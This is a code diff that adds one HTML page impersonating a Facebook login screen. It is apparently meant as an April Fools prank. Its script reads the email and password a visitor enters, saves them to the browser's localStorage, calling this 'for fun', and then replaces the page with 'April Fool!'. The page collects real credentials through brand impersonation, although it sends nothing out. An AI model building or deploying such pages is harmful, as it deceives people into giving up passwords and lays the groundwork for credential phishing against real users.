@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; margin-top: 50px; }
+        .login-box { width: 300px; margin: auto; padding: 20px; border: 1px solid #ccc; }
+        input { display: block; width: 100%; margin-bottom: 10px; padding: 10px; }
+        button { width: 100%; padding: 10px; background: blue; color: white; border: none; }
+    </style>
+</head>
+<body>
+
+    <h2>Facebook</h2>
+    <div class="login-box">
+        <input type="text" id="email" placeholder="Email or Phone">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="foolUser()">Log In</button>
+    </div>
+
+    <script>
+        function foolUser() {
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+
+            if(email && password) {
+                // Save credentials (for fun)
+                localStorage.setItem(email, password);
+
+                // Redirect to the Fool Page
+                document.body.innerHTML = '<h1>April Fool!</h1>';
+            } else {
+                alert('Please enter your credentials.');
+            }
+        }
+    </script>
+
+</body>
+</html>
